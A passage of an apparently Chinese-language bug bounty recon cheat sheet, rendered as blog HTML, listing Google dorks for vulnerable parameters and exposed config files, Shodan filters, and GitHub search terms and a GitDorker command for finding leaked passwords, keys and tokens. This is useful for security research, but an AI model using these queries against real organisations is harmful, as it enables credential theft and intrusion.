class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">宽域搜索/否定搜索</span><br><span class="line"></span><br><span class="line"> site:example.com -www -shop -share -ir -mfa </span><br><span class="line"></span><br><span class="line">带参数的 PHP 扩展</span><br><span class="line"></span><br><span class="line"> site:example.com ext:php inurl:? </span><br><span class="line"></span><br><span class="line">应用程序接口端点</span><br><span class="line"></span><br><span class="line"> site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3 </span><br><span class="line"></span><br><span class="line">多汁的扩展</span><br><span class="line"></span><br><span class="line">site:&quot;example[.]com&quot; ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">高百分比 inurl 关键字</span><br><span class="line"></span><br><span class="line">inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example[.]com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器错误</span><br><span class="line"></span><br><span class="line">inurl:&quot;error&quot; | intitle:&quot;exception&quot; | intitle:&quot;failure&quot; | intitle:&quot;server at&quot; | inurl:exception | &quot;database error&quot; | &quot;SQL syntax&quot; | &quot;undefined index&quot; | &quot;unhandled exception&quot; | &quot;stack trace&quot; site:example[.]com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">易发生 XSS 的参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:&amp; site:example.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开重定向容易参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:&amp; inurl:http site:example.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQLi 易错参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:&amp; site:example.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSRF 易损参数</span><br><span class="line"></span><br><span class="line">inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:&amp; site:example.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LFI 易损参数</span><br><span class="line">`</span><br><span class="line">inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= |inurl:locate= | inurl:doc= | inurl:conf= inurl:&amp; site:example.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">易发生 RCE 的参数</span><br><span class="line"></span><br><span class="line">`</span><br><span class="line">inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read=  | inurl:ping= inurl:&amp; site:example.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件上传端点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:example.com ”choose file” </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">应用程序接口文档</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:&quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">登录页面</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example[.]com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">敏感文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:example.com ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> intext:“confidential” | intext:“Not for Public Release” | intext:”internal use only” | intext:“do not distribute” </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">敏感参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:&amp; site:example[.]com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Adobe 体验管理器（AEM）</span><br><span class="line"></span><br><span class="line">inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:example[.]com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">已披露的 XSS 和开放式重定向</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:openbugbounty.org inurl:reports intext:&quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码泄漏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:pastebin.com &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:jsfiddle.net &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:codebeautify.org &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:codepen.io &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">云存储</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:s3.amazonaws.com &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:blob.core.windows.net &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:googleapis.com &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:drive.google.com &quot;example.com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:dev.azure.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:onedrive.live.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:digitaloceanspaces.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:sharepoint.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:s3-external-1.amazonaws.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:s3.dualstack.us-east-1.amazonaws.com &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:dropbox.com/s &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:box.com/s &quot;example[.]com&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> site:docs.google.com inurl:&quot;/d/&quot; &quot;example[.]com&quot;</span><br><span class="line"> </span><br><span class="line">JFrog Artifactory</span><br><span class="line"></span><br><span class="line">site:jfrog.io &quot;example[.]com&quot;</span><br><span class="line"></span><br><span class="line">Firebase</span><br><span class="line"></span><br><span class="line">site:firebaseio.com &quot;example[.]com&quot;</span><br><span class="line"></span><br><span class="line">漏洞悬赏计划和漏洞披露计划</span><br><span class="line"></span><br><span class="line"> &quot;submit vulnerability report&quot; | &quot;powered by bugcrowd&quot; | &quot;powered by hackerone&quot; </span><br><span class="line"></span><br><span class="line"> site:*/security.txt &quot;bounty&quot; </span><br><span class="line"></span><br><span class="line">阿帕奇服务器状态曝光</span><br><span class="line"></span><br><span class="line"> site:*/server-status apache </span><br><span class="line"></span><br><span class="line">WordPress</span><br><span class="line"></span><br><span class="line"> inurl:/wp-admin/admin-ajax.php </span><br><span class="line"></span><br><span class="line">Drupal</span><br><span class="line"></span><br><span class="line"> intext:&quot;Powered by&quot; &amp; intext:Drupal &amp; inurl:user </span><br><span class="line"></span><br><span class="line">Joomla</span><br><span class="line"></span><br><span class="line"> site:*/joomla/login </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="shadon语法"><a href="#shadon语法" class="headerlink" title="shadon语法"></a>shadon语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1. org:&quot;http://target. com&quot;</span><br><span class="line">2. http.status:&quot;&lt;status_code&gt;&quot; </span><br><span class="line">3. product:&quot;&lt;Product_Name&gt;&quot; </span><br><span class="line">4. port:&lt;Port_Number&gt; “Service_Message” </span><br><span class="line">5. port:&lt;Port_Number&gt; “Service_Name” </span><br><span class="line">6. http.component:&quot;&lt;Component_Name&gt;&quot; </span><br><span class="line">7. http.component_category:&quot;&lt;Component_Category&gt; </span><br><span class="line">8. http.waf:&quot;&lt;firewall_name&gt;&quot; </span><br><span class="line">9. http.html:&quot;&lt;Name&gt;&quot; </span><br><span class="line">10. http.title:&quot;&lt;Title_Name&gt;&quot; </span><br><span class="line">11. ssl.alpn:&quot;&lt;Protocol&gt;&quot; </span><br><span class="line">12. http.favicon.hash:&quot;&lt;Favicon_Hash&gt;&quot; </span><br><span class="line">13. net:&quot;&lt;Net_Range&gt;&quot; (for e.g. 104.16.100.52/32) </span><br><span class="line">14. http://ssl.cert.subject.cn:&quot;&lt;http://Domain .com&gt;&quot; </span><br><span class="line">15. asn:&quot;&lt;ASnumber&gt;&quot; </span><br><span class="line">16. hostname:&quot;&lt;hosthame&gt;&quot; </span><br><span class="line">17. ip:&quot;&lt;IP_Address&gt;&quot; </span><br><span class="line">18. all:&quot;&lt;Keyword&gt;&quot; </span><br><span class="line">19. “Set-Cookie: phpMyAdmin” </span><br><span class="line">20. “Set-Cookie: lang=&quot; </span><br><span class="line">21. “Set-Cookie: PHPSESSID&quot; </span><br><span class="line">22. “Set-Cookie: webvpn” </span><br><span class="line">23. “Set-Cookie:webvpnlogin=1&quot; </span><br><span class="line">24. “Set-Cookie:webvpnLang=en” </span><br><span class="line">25. “Set-Cookie: mongo-express=&quot; </span><br><span class="line">26. “Set-Cookie: user_id=&quot; </span><br><span class="line">27. “Set-Cookie: phpMyAdmin=&quot; </span><br><span class="line">28. “Set-Cookie: _gitlab_session” </span><br><span class="line">29. “X-elastic-product: Elasticsearch” </span><br><span class="line">30. “x-drupal-cache” </span><br><span class="line">31. “access-control-allow-origin” </span><br><span class="line">32. “WWW-Authenticate”  </span><br><span class="line">33. “X-Magento-Cache-Debug”   </span><br><span class="line">34. “kbn-name: kibana”</span><br></pre></td></tr></table></figure><h3 id="github语法"><a href="#github语法" class="headerlink" title="github语法"></a>github语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">api_key</span><br><span class="line">“api keys”</span><br><span class="line">authorization_bearer:</span><br><span class="line">oauth</span><br><span class="line">auth</span><br><span class="line">authentication</span><br><span class="line">client_secret</span><br><span class="line">api_token:</span><br><span class="line">“api token”</span><br><span class="line">client_id</span><br><span class="line">password</span><br><span class="line">user_password</span><br><span class="line">user_pass</span><br><span class="line">passcode</span><br><span class="line">client_secret</span><br><span class="line">secret</span><br><span class="line">password hash</span><br><span class="line">OTP</span><br><span class="line">user auth</span><br><span class="line">#Some of the mine which I use generally</span><br><span class="line"></span><br><span class="line">remove password</span><br><span class="line">root</span><br><span class="line">admin</span><br><span class="line">log</span><br><span class="line">trash</span><br><span class="line">token</span><br><span class="line">FTP_PORT</span><br><span class="line">FTP_PASSWORD</span><br><span class="line">DB_DATABASE=</span><br><span class="line">DB_HOST=</span><br><span class="line">DB_PORT=</span><br><span class="line">DB_PASSWORD=</span><br><span class="line">DB_PW=</span><br><span class="line">DB_USER=</span><br><span class="line">number</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">like: language:shell username</span><br><span class="line">language:sql username</span><br><span class="line">language:python ftp</span><br><span class="line">language:bash ftp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ste:xxyz.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:txt | ext:html | ext:php | ext:xls`)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>useful</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br></pre></td><td class="code"><pre><span class="line">dotfiles</span><br><span class="line">filename:sftp-config.json password</span><br><span class="line">filename:.s3cfg</span><br><span class="line">filename:config.php dbpasswd</span><br><span class="line">filename:.bashrc password</span><br><span class="line">filename:.esmtprc password</span><br><span class="line">filename:.netrc password</span><br><span class="line">filename:_netrc password</span><br><span class="line">filename:.env MAIL_HOST=smtp.gmail.com</span><br><span class="line">filename:prod.exs NOT prod.secret.exs</span><br><span class="line">filename:.npmrc _auth</span><br><span class="line">filename:WebServers.xml</span><br><span class="line">filename:sftp-config.json</span><br><span class="line">filename:.esmtprc password</span><br><span class="line">filename:passwd path:etc</span><br><span class="line">filename:prod.secret.exs</span><br><span class="line">filename:sftp-config.json</span><br><span class="line">filename:proftpdpasswd</span><br><span class="line">filename:travis.yml</span><br><span class="line">filename:vim_settings.xml</span><br><span class="line">filename:sftp.json path:.vscode</span><br><span class="line">filename:secrets.yml password</span><br><span class="line">extension:sql mysql dump</span><br><span class="line">extension:sql mysql dump</span><br><span class="line">extension:sql mysql dump password</span><br><span class="line">extension:pem private</span><br><span class="line">extension:ppk private</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">自动化：</span><br><span class="line">手动方式最适合从 Github 中查找敏感信息。但如果你想自动化这一过程，我建议你使用 GitDorker。在猎取 GitHub 的过程中，我有时也会使用这个工具。虽然它的速度有点慢，因为为了防止速率限制，Gitdocker 每分钟会发送 30 个请求。但它提供的错误结果比其他工具要少得多。</span><br><span class="line"></span><br><span class="line">此外，你还可以使用这个工具，它给我带来了惊人的效果</span><br><span class="line"></span><br><span class="line">$ git clone https://github.com/obheda12/GitDorker</span><br><span class="line">$ python3 GitDorker.py -tf ~/Tools/.github_tokens -q united.com -p -ri -d Dorks/medium_dorks.txt</span><br><span class="line"> </span><br><span class="line">呆子名单</span><br><span class="line">&quot;.mlab.com password&quot;</span><br><span class="line">&quot;access_key&quot;</span><br><span class="line">&quot;access_token&quot;</span><br><span class="line">&quot;amazonaws&quot;</span><br><span class="line">&quot;api.googlemaps AIza&quot;</span><br><span class="line">&quot;api_key&quot;</span><br><span class="line">&quot;api_secret&quot;</span><br><span class="line">&quot;apidocs&quot;</span><br><span class="line">&quot;apikey&quot;</span><br><span class="line">&quot;apiSecret&quot;</span><br><span class="line">&quot;app_key&quot;</span><br><span class="line">&quot;app_secret&quot;</span><br><span class="line">&quot;appkey&quot;</span><br><span class="line">&quot;appkeysecret&quot;</span><br><span class="line">&quot;application_key&quot;</span><br><span class="line">&quot;appsecret&quot;</span><br><span class="line">&quot;appspot&quot;</span><br><span class="line">&quot;auth&quot;</span><br><span class="line">&quot;auth_token&quot;</span><br><span class="line">&quot;authorizationToken&quot;</span><br><span class="line">&quot;aws_access&quot;</span><br><span class="line">&quot;aws_access_key_id&quot;</span><br><span class="line">&quot;aws_key&quot;</span><br><span class="line">&quot;aws_secret&quot;</span><br><span class="line">&quot;aws_token&quot;</span><br><span class="line">&quot;AWSSecretKey&quot;</span><br><span class="line">&quot;bashrc password&quot;</span><br><span class="line">&quot;bucket_password&quot;</span><br><span class="line">&quot;client_secret&quot;</span><br><span class="line">&quot;cloudfront&quot;</span><br><span class="line">&quot;codecov_token&quot;</span><br><span class="line">&quot;config&quot;</span><br><span class="line">&quot;conn.login&quot;</span><br><span class="line">&quot;connectionstring&quot;</span><br><span class="line">&quot;consumer_key&quot;</span><br><span class="line">&quot;credentials&quot;</span><br><span class="line">&quot;database_password&quot;</span><br><span class="line">&quot;db_password&quot;</span><br><span class="line">&quot;db_username&quot;</span><br><span class="line">&quot;dbpasswd&quot;</span><br><span class="line">&quot;dbpassword&quot;</span><br><span class="line">&quot;dbuser&quot;</span><br><span class="line">&quot;dot-files&quot;</span><br><span class="line">&quot;dotfiles&quot;</span><br><span class="line">&quot;encryption_key&quot;</span><br><span class="line">&quot;fabricApiSecret&quot;</span><br><span class="line">&quot;fb_secret&quot;</span><br><span class="line">&quot;firebase&quot;</span><br><span class="line">&quot;ftp&quot;</span><br><span class="line">&quot;gh_token&quot;</span><br><span class="line">&quot;github_key&quot;</span><br><span class="line">&quot;github_token&quot;</span><br><span class="line">&quot;gitlab&quot;</span><br><span class="line">&quot;gmail_password&quot;</span><br><span class="line">&quot;gmail_username&quot;</span><br><span class="line">&quot;herokuapp&quot;</span><br><span class="line">&quot;internal&quot;</span><br><span class="line">&quot;irc_pass&quot;</span><br><span class="line">&quot;JEKYLL_GITHUB_TOKEN&quot;</span><br><span class="line">&quot;key&quot;</span><br><span class="line">&quot;keyPassword&quot;</span><br><span class="line">&quot;ldap_password&quot;</span><br><span class="line">&quot;ldap_username&quot;</span><br><span class="line">&quot;login&quot;</span><br><span class="line">&quot;mailchimp&quot;</span><br><span class="line">&quot;mailgun&quot;</span><br><span class="line">&quot;master_key&quot;</span><br><span class="line">&quot;mydotfiles&quot;</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">&quot;node_env&quot;</span><br><span class="line">&quot;npmrc _auth&quot;</span><br><span class="line">&quot;oauth_token&quot;</span><br><span class="line">&quot;pass&quot;</span><br><span class="line">&quot;passwd&quot;</span><br><span class="line">&quot;password&quot;</span><br><span class="line">&quot;passwords&quot;</span><br><span class="line">&quot;pem private&quot;</span><br><span class="line">&quot;preprod&quot;</span><br><span class="line">&quot;private_key&quot;</span><br><span class="line">&quot;prod&quot;</span><br><span class="line">&quot;pwd&quot;</span><br><span class="line">&quot;pwds&quot;</span><br><span class="line">&quot;rds.amazonaws.com password&quot;</span><br><span class="line">&quot;redis_password&quot;</span><br><span class="line">&quot;root_password&quot;</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">&quot;secret.password&quot;</span><br><span class="line">&quot;secret_access_key&quot;</span><br><span class="line">&quot;secret_key&quot;</span><br><span class="line">&quot;db_password&quot;</span><br><span class="line">&quot;db_username&quot;</span><br><span class="line">&quot;dbpasswd&quot;</span><br><span class="line">&quot;dbpassword&quot;</span><br><span class="line">&quot;dbuser&quot;</span><br><span class="line">&quot;dot-files&quot;</span><br><span 